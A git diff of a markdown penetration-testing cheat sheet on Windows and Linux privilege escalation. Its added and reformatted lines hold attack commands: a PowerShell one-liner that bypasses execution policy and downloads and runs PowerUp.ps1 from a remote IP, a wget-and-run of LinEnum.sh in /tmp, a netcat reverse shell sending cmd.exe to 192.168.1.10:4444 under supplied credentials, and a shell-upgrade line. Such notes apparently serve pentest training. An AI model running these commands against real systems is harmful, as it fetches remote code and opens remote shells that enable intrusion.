@@ -15,6 +15,15 @@ https://github.com/doffensive/wired-courtyard
 ## Tips and Hints
 - .JOB files are scheduled jobs which are not registered with the schtasks.
 
+## Main Enumeration Scripts
+```batch
+powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.139/PowerUp.ps1'); Invoke-AllChecks"
+
+Rem need to transfer both accesschk.exe and powerless.bat to the machine.
+accesschk.exe
+powerless.bat
+```
+
 ## Powershell
 Running Local Commands
 ```powershell
@@ -65,12 +74,12 @@ PsExec for On Remote Machine
 Powershell window to Run as a different user
 ```powershell
 $username = '<username here>'
- $password = '<password here>'
- $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
- $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
- Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
+$password = '<password here>'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
 
- powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
+powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
 ```
 
 Runas (e.g. su) for Windows with other creds. CAN'T PASS PASSWORD THO!
@@ -110,6 +119,21 @@ https://github.com/xapax/security/blob/master/privilege_escalation_windows.md
 ###
 # Linux
 ## Tips and Hints
+### Main Enumeration Scripts
+```bash
+export A=http://<IP>
+export H=http://<IP>:8000
+cd /tmp
+wget $A/LinEnum.sh
+bash LinEnum.sh
+
+...
+
+linux-exploit-suggester.sh
+linux-exploit-suggester2.pl
+linuxprivchecker.py
+```
+
 Upgrade shells
 ```python
 python -c 'import pty;pty.spawn("/bin/bash")'
